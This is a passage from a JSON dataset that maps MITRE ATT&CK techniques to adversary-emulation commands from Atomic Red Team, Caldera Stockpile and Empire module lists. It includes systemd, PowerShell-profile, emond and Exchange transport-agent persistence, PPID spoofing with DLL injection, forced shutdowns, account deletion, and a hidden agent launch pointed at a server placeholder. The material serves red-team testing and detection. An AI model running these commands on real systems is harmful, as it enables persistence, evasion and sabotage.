#{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "echo \"[Unit]\" > /etc/systemd/system/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> /etc/systemd/system/#{systemd_service_file}\necho \"\" >> /etc/systemd/system/#{systemd_service_file}\necho \"[Service]\" >> /etc/systemd/system/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> /etc/systemd/system/#{systemd_service_file}\necho \"\" >> /etc/systemd/system/#{systemd_service_file}\necho \"[Install]\" >> /etc/systemd/system/#{systemd_service_file}\necho \"WantedBy=default.target\" >> /etc/systemd/system/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n", "echo \"[Unit]\" > #{systemd_service_path}/art-systemd-service.service\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/art-systemd-service.service\necho \"\" >> #{systemd_service_path}/art-systemd-service.service\necho \"[Service]\" >> #{systemd_service_path}/art-systemd-service.service\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/art-systemd-service.service\necho \"\" >> #{systemd_service_path}/art-systemd-service.service\necho \"[Install]\" >> #{systemd_service_path}/art-systemd-service.service\necho \"WantedBy=default.target\" >> #{systemd_service_path}/art-systemd-service.service\nsystemctl daemon-reload\nsystemctl enable art-systemd-service.service\nsystemctl start art-systemd-service.service\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1502", "commands": [{"source": "atomics/T1502/T1502.yaml", "command": ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process explorer | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n", "name": null}, {"source": "atomics/T1502/T1502.yaml", "command": ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"PathToAtomicsFolder\\T1502\\bin\\calc.dll\"\n", "name": null}, {"source": "atomics/T1502/T1502.yaml", "command": ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n", "name": null}, {"source": "atomics/T1502/T1502.yaml", "command": ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"C:\\Program Files\\Internet Explorer\\iexplore.exe\" -dllpath \"#{dll_path}\"\n", "name": null}, {"source": "atomics/T1502/T1502.yaml", "command": ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Parent PID Spoofing": {"attack_technique": "T1502", "display_name": "Parent PID Spoofing", "atomic_tests": [{"name": "Parent PID Spoofing using PowerShell", "description": "This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.\nUpon execution, \"Process C:\\Program Files\\Internet Explorer\\iexplore.exe is spawned with pid ####\" will be displayed and\ncalc.exe will be launched.\n\nCredit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n", "supported_platforms": ["windows"], "input_arguments": {"parent_process_name": {"description": "Name of the parent process", "type": "string", "default": "explorer"}, "dll_path": {"description": "Path of the dll to inject", "type": "path", "default": "PathToAtomicsFolder\\T1502\\bin\\calc.dll"}, "dll_process_name": {"description": "Name of the created process from the injected dll", "type": "string", "default": "calculator"}, "spawnto_process_path": {"description": "Path of the process to spawn", "type": "path", "default": "C:\\Program Files\\Internet Explorer\\iexplore.exe"}, "spawnto_process_name": {"description": "Name of the process to spawn", "type": "string", "default": "iexplore"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "DLL to inject must exist on disk at specified location (#{dll_path})\n", "prereq_command": "if (Test-Path #{dll_path}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{dll_path}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1502/bin/calc.dll\" -OutFile \"#{dll_path}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n", "cleanup_command": "Stop-Process -Name \"#{dll_process_name}\" -ErrorAction Ignore\nStop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore\n"}}]}}], "command_list": [". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process explorer | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n", ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"PathToAtomicsFolder\\T1502\\bin\\calc.dll\"\n", ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n", ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"C:\\Program Files\\Internet Explorer\\iexplore.exe\" -dllpath \"#{dll_path}\"\n", ". $PathToAtomicsFolder\\T1502\\src\\PPID-Spoof.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1504", "commands": [{"source": "atomics/T1504/T1504.yaml", "command": "Add-Content #{ps_profile} -Value \"\"\nAdd-Content #{ps_profile} -Value \"Start-Process calc.exe\"\npowershell -Command exit\n", "name": null}, {"source": "atomics/T1504/T1504.yaml", "command": "Add-Content $profile -Value \"\"\nAdd-Content $profile -Value \"Start-Process #{exe_path}\"\npowershell -Command exit\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - PowerShell Profile": {"attack_technique": "T1504", "display_name": "PowerShell Profile", "atomic_tests": [{"name": "Append malicious start-process cmdlet", "description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"exe_path": {"description": "Path the malicious executable", "type": "Path", "default": "calc.exe"}, "ps_profile": {"description": "Powershell profile to use", "type": "String", "default": "$profile"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Ensure a powershell profile exists for the current user\n", "prereq_command": "if (Test-Path #{ps_profile}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path #{ps_profile} -Type File -Force\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Add-Content #{ps_profile} -Value \"\"\nAdd-Content #{ps_profile} -Value \"Start-Process #{exe_path}\"\npowershell -Command exit\n", "cleanup_command": "$oldprofile = cat $profile | Select-Object -skiplast 1\nSet-Content $profile -Value $oldprofile\n"}}]}}], "command_list": ["Add-Content #{ps_profile} -Value \"\"\nAdd-Content #{ps_profile} -Value \"Start-Process calc.exe\"\npowershell -Command exit\n", "Add-Content $profile -Value \"\"\nAdd-Content $profile -Value \"Start-Process #{exe_path}\"\npowershell -Command exit\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1505", "commands": [{"source": "atomics/T1505/T1505.yaml", "command": "Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}\nEnable-TransportAgent Security Interop Agent\nGet-TransportAgent | Format-List Name,Enabled\n", "name": null}, {"source": "atomics/T1505/T1505.yaml", "command": "Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll\nEnable-TransportAgent #{transport_agent_identity}\nGet-TransportAgent | Format-List Name,Enabled\n", "name": null}, {"source": "atomics/T1505/T1505.yaml", "command": "Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath #{dll_path}\nEnable-TransportAgent #{transport_agent_identity}\nGet-TransportAgent | Format-List Name,Enabled\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Server Software Component": {"attack_technique": "T1505", "display_name": "Server Software Component", "atomic_tests": [{"name": "Install MS Exchange Transport Agent Persistence", "description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n", "supported_platforms": ["windows"], "input_arguments": {"transport_agent_identity": {"description": "Friendly name of transport agent once installed.", "type": "string", "default": "Security Interop Agent"}, "dll_path": {"description": "Path of DLL to use as transport agent.", "type": "path", "default": "c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll"}, "class_factory": {"description": "Class factory of transport agent.", "type": "string", "default": "Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory"}}, "dependencies": [{"description": "Microsoft Exchange SnapIn must be installed\n", "prereq_command": "Get-TransportAgent -TransportService FrontEnd\n", "get_prereq_command": "Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn\n"}], "executor": {"name": "powershell", "elevation_required": true, "command": "Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}\nEnable-TransportAgent #{transport_agent_identity}\nGet-TransportAgent | Format-List Name,Enabled\n", "cleanup_command": "Disable-TransportAgent #{transport_agent_identity}\nUninstall-TransportAgent #{transport_agent_identity}\nGet-TransportAgent\n"}}]}}], "command_list": ["Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}\nEnable-TransportAgent Security Interop Agent\nGet-TransportAgent | Format-List Name,Enabled\n", "Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll\nEnable-TransportAgent #{transport_agent_identity}\nGet-TransportAgent | Format-List Name,Enabled\n", "Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath #{dll_path}\nEnable-TransportAgent #{transport_agent_identity}\nGet-TransportAgent | Format-List Name,Enabled\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1518", "commands": [{"source": "atomics/T1518/T1518.yaml", "command": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n", "name": null}, {"source": "atomics/T1518/T1518.yaml", "command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\n", "name": null}, {"source": "data/abilities/discovery/c9be8043-a445-4cbf-b77b-ed7bb007fc7c.yml", "command": {"windows": {"psh": {"command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version\n"}}}, "name": "Determine the version of Internet Explorer running"}], "parsed_datasets": [{"Atomic Red Team Test - Software Discovery": {"attack_technique": "T1518", "display_name": "Software Discovery", "atomic_tests": [{"name": "Find and Display Internet Explorer Browser Version", "description": "Query the registry to determine the version of internet explorer installed on the system.\nUpon execution, version information about internet explorer will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n"}}, {"name": "Applications Installed", "description": "Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\n"}}]}}, {"Mitre Stockpile - Determine the version of Internet Explorer running": {"id": "c9be8043-a445-4cbf-b77b-ed7bb007fc7c", "name": "Internet Explorer Version", "description": "Determine the version of Internet Explorer running", "tactic": "discovery", "technique": {"attack_id": "T1518", "name": "Software Discovery"}, "platforms": {"windows": {"psh": {"command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version\n"}}}}}], "command_list": ["reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n", "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\n", {"windows": {"psh": {"command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version\n"}}}], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1519", "commands": [{"source": "atomics/T1519/T1519.yaml", "command": "sudo cp \"PathToAtomicsFolder/T1519/src/T1519_emond.plist\" /etc/emond.d/rules/T1519_emond.plist\nsudo touch /private/var/db/emondClients/T1519\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Emond": {"attack_technique": "T1519", "display_name": "Emond", "atomic_tests": [{"name": "Persistance with Event Monitor - emond", "description": "Establish persistence via a rule run by OSX's emond (Event Monitor) daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124\n", "supported_platforms": ["macos"], "input_arguments": {"plist": {"description": "Path to attacker emond plist file", "type": "path", "default": "PathToAtomicsFolder/T1519/src/T1519_emond.plist"}}, "executor": {"name": "sh", "elevation_required": true, "command": "sudo cp \"#{plist}\" /etc/emond.d/rules/T1519_emond.plist\nsudo touch /private/var/db/emondClients/T1519\n", "cleanup_command": "sudo rm /etc/emond.d/rules/T1519_emond.plist\nsudo rm /private/var/db/emondClients/T1519\n"}}]}}], "command_list": ["sudo cp \"PathToAtomicsFolder/T1519/src/T1519_emond.plist\" /etc/emond.d/rules/T1519_emond.plist\nsudo touch /private/var/db/emondClients/T1519\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1529", "commands": [{"source": "atomics/T1529/T1529.yaml", "command": null, "name": null}, {"source": "atomics/T1529/T1529.yaml", "command": null, "name": null}, {"source": "atomics/T1529/T1529.yaml", "command": "shutdown -r now\n", "name": null}, {"source": "atomics/T1529/T1529.yaml", "command": "shutdown -h now\n", "name": null}, {"source": "atomics/T1529/T1529.yaml", "command": "reboot\n", "name": null}, {"source": "atomics/T1529/T1529.yaml", "command": "halt -p\n", "name": null}, {"source": "atomics/T1529/T1529.yaml", "command": "halt --reboot\n", "name": null}, {"source": "atomics/T1529/T1529.yaml", "command": "poweroff\n", "name": null}, {"source": "atomics/T1529/T1529.yaml", "command": "poweroff --reboot\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - System Shutdown/Reboot": {"attack_technique": "T1529", "display_name": "System Shutdown/Reboot", "atomic_tests": [{"name": "Shutdown System - Windows", "description": "This test shuts down a Windows system.\n", "supported_platforms": ["windows"], "input_arguments": {"timeout": {"description": "Timeout period before shutdown (seconds)", "type": "string", "default": 1}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "shutdown /s /t #{timeout}\n"}}, {"name": "Restart System - Windows", "description": "This test restarts a Windows system.\n", "supported_platforms": ["windows"], "input_arguments": {"timeout": {"description": "Timeout period before restart (seconds)", "type": "string", "default": 1}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "shutdown /r /t #{timeout}\n"}}, {"name": "Restart System via `shutdown` - macOS/Linux", "description": "This test restarts a macOS/Linux system.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"timeout": {"description": "Time to restart (can be minutes or specific time)", "type": "string", "default": "now"}}, "executor": {"name": "bash", "elevation_required": true, "command": "shutdown -r #{timeout}\n"}}, {"name": "Shutdown System via `shutdown` - macOS/Linux", "description": "This test shuts down a macOS/Linux system using a halt.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"timeout": {"description": "Time to shutdown (can be minutes or specific time)", "type": "string", "default": "now"}}, "executor": {"name": "bash", "elevation_required": true, "command": "shutdown -h #{timeout}\n"}}, {"name": "Restart System via `reboot` - macOS/Linux", "description": "This test restarts a macOS/Linux system via `reboot`.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "bash", "elevation_required": true, "command": "reboot\n"}}, {"name": "Shutdown System via `halt` - Linux", "description": "This test shuts down a Linux system using `halt`.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": true, "command": "halt -p\n"}}, {"name": "Reboot System via `halt` - Linux", "description": "This test restarts a Linux system using `halt`.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": true, "command": "halt --reboot\n"}}, {"name": "Shutdown System via `poweroff` - Linux", "description": "This test shuts down a Linux system using `poweroff`.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": true, "command": "poweroff\n"}}, {"name": "Reboot System via `poweroff` - Linux", "description": "This test restarts a Linux system using `poweroff`.\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": true, "command": "poweroff --reboot\n"}}]}}], "command_list": [null, null, "shutdown -r now\n", "shutdown -h now\n", "reboot\n", "halt -p\n", "halt --reboot\n", "poweroff\n", "poweroff --reboot\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1531", "commands": [{"source": "atomics/T1531/T1531.yaml", "command": "net.exe user AtomicAdministrator #{new_password}\n", "name": null}, {"source": "atomics/T1531/T1531.yaml", "command": "net.exe user #{user_account} HuHuHUHoHo283283@dJD\n", "name": null}, {"source": "atomics/T1531/T1531.yaml", "command": "net.exe user #{user_account} #{new_password}\n", "name": null}, {"source": "atomics/T1531/T1531.yaml", "command": "net.exe user AtomicUser /delete\n", "name": null}, {"source": "atomics/T1531/T1531.yaml", "command": "net.exe user #{user_account} /delete\n", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Account Access Removal": {"attack_technique": "T1531", "display_name": "Account Access Removal", "atomic_tests": [{"name": "Change User Password - Windows", "description": "Changes the user password to hinder access attempts. Seen in use by LockerGoga. Upon execution, log into the user account \"AtomicAdministrator\" with\nthe password \"HuHuHUHoHo283283\".\n", "supported_platforms": ["windows"], "input_arguments": {"user_account": {"description": "User account whose password will be changed.", "type": "string", "default": "AtomicAdministrator"}, "new_password": {"description": "New password for the specified account.", "type": "string", "default": "HuHuHUHoHo283283@dJD"}, "new_user_password": {"description": "Password to use if user account must be created first", "type": "string", "default": "User2ChangePW!"}}, "dependencies": [{"description": "User account to change password of must exist (User: #{user_account})\n", "prereq_command": "net user #{user_account}\n", "get_prereq_command": "net user #{user_account} #{new_user_password} /add\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "net.exe user #{user_account} #{new_password}\n", "cleanup_command": "net.exe user #{user_account} /delete >nul 2>&1\n"}}, {"name": "Delete User - Windows", "description": "Deletes a user account to prevent access. Upon execution, run the command \"net user\" to verify that the new \"AtomicUser\" account was deleted.\n", "supported_platforms": ["windows"], "input_arguments": {"user_account": {"description": "User account to be deleted.", "type": "string", "default": "AtomicUser"}, "new_user_password": {"description": "Password to use if user account must be created first", "type": "string", "default": "User2DeletePW!"}}, "dependencies": [{"description": "User account to delete must exist (User: #{user_account})\n", "prereq_command": "net user #{user_account}\n", "get_prereq_command": "net user #{user_account} #{new_user_password} /add\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "net.exe user #{user_account} /delete\n"}}]}}], "command_list": ["net.exe user AtomicAdministrator #{new_password}\n", "net.exe user #{user_account} HuHuHUHoHo283283@dJD\n", "net.exe user #{user_account} #{new_password}\n", "net.exe user AtomicUser /delete\n", "net.exe user #{user_account} /delete\n"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1108", "commands": [{"source": "data/abilities/defense-evasion/36eecb80-ede3-442b-8774-956e906aff02.yml", "command": {"darwin": {"sh": {"command": "sleep 60"}}, "linux": {"sh": {"command": "sleep 60"}}, "windows": {"psh": {"command": "sleep 60"}}}, "name": "Pause all operations to avoid making noise"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/skeleton_key", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/skeleton_key", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/powerbreach/deaduser", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/powerbreach/deaduser", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/powerbreach/eventlog", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/powerbreach/eventlog", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/powerbreach/resolver", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/powerbreach/resolver", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre Stockpile - Pause all operations to avoid making noise": {"id": "36eecb80-ede3-442b-8774-956e906aff02", "name": "1-min sleep", "description": "Pause all operations to avoid making noise", "tactic": "defense-evasion", "technique": {"attack_id": "T1108", "name": "Redundant Access"}, "platforms": {"darwin": {"sh": {"command": "sleep 60"}}, "linux": {"sh": {"command": "sleep 60"}}, "windows": {"psh": {"command": "sleep 60"}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/misc/skeleton_key", "ATT&CK Technique #1": "T1108", "ATT&CK Technique #2": "", "Technique": "Redundant Access", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/skeleton_key\":  [\"T1108\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/powerbreach/deaduser", "ATT&CK Technique #1": "T1108", "ATT&CK Technique #2": "", "Technique": "Redundant Access", "Concatenate for Python Dictionary": "\"powershell/persistence/powerbreach/deaduser\":  [\"T1108\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/powerbreach/eventlog", "ATT&CK Technique #1": "T1108", "ATT&CK Technique #2": "", "Technique": "Redundant Access", "Concatenate for Python Dictionary": "\"powershell/persistence/powerbreach/eventlog\":  [\"T1108\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/powerbreach/resolver", "ATT&CK Technique #1": "T1108", "ATT&CK Technique #2": "", "Technique": "Redundant Access", "Concatenate for Python Dictionary": "\"powershell/persistence/powerbreach/resolver\":  [\"T1108\"],"}}], "command_list": [{"darwin": {"sh": {"command": "sleep 60"}}, "linux": {"sh": {"command": "sleep 60"}}, "windows": {"psh": {"command": "sleep 60"}}}, "powershell/persistence/misc/skeleton_key", "powershell/persistence/misc/skeleton_key", "powershell/persistence/powerbreach/deaduser", "powershell/persistence/powerbreach/deaduser", "powershell/persistence/powerbreach/eventlog", "powershell/persistence/powerbreach/eventlog", "powershell/persistence/powerbreach/resolver", "powershell/persistence/powerbreach/resolver"], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1497", "commands": [{"source": "data/abilities/discovery/5dc841fd-28ad-40e2-b10e-fb007fe09e81.yml", "command": {"windows": {"psh": {"command": "get-wmiobject win32_computersystem | fl model\n"}}}, "name": "Determine if the system is virtualized or physical"}], "parsed_datasets": [{"Mitre Stockpile - Determine if the system is virtualized or physical": {"id": "5dc841fd-28ad-40e2-b10e-fb007fe09e81", "name": "Virtual or Real", "description": "Determine if the system is virtualized or physical", "tactic": "discovery", "technique": {"attack_id": "T1497", "name": "Virtualization Sandbox Evasion"}, "platforms": {"windows": {"psh": {"command": "get-wmiobject win32_computersystem | fl model\n"}}}}}], "command_list": [{"windows": {"psh": {"command": "get-wmiobject win32_computersystem | fl model\n"}}}], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1120", "commands": [{"source": "data/abilities/discovery/9b007f62-daa1-44bd-a57d-00c5315ec6fe.yml", "command": {"darwin": {"sh": {"command": "system_profiler SPUSBDataType\n"}}}, "name": "find attached usb devices"}], "parsed_datasets": [{"Mitre Stockpile - find attached usb devices": {"id": "9b007f62-daa1-44bd-a57d-00c5315ec6fe", "name": "USB Connected Device Discovery", "description": "find attached usb devices", "tactic": "discovery", "technique": {"attack_id": "T1120", "name": "Peripheral Device Discovery"}, "platforms": {"darwin": {"sh": {"command": "system_profiler SPUSBDataType\n"}}}}}], "command_list": [{"darwin": {"sh": {"command": "system_profiler SPUSBDataType\n"}}}], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1072", "commands": [{"source": "data/abilities/execution/60f63260-39bb-4136-87a0-b6c2dca799fc.yml", "command": {"windows": {"psh": {"command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group} -executors pwsh\" -WindowStyle hidden;\n", "cleanup": "rm PowerShellCore.msi;\n"}}}, "name": "Download, install and start new process under PowerShell Core 6"}], "parsed_datasets": [{"Mitre Stockpile - Download, install and start new process under PowerShell Core 6": {"id": "60f63260-39bb-4136-87a0-b6c2dca799fc", "name": "Install PowerShell Core 6", "description": "Download, install and start new process under PowerShell Core 6", "tactic": "execution", "technique": {"attack_id": "T1072", "name": "Third-party Software"}, "platforms": {"windows": {"psh": {"command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group} -executors pwsh\" -WindowStyle hidden;\n", "cleanup": "rm PowerShellCore.msi;\n"}}}}}], "command_list": [{"windows": {"psh": {"command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet 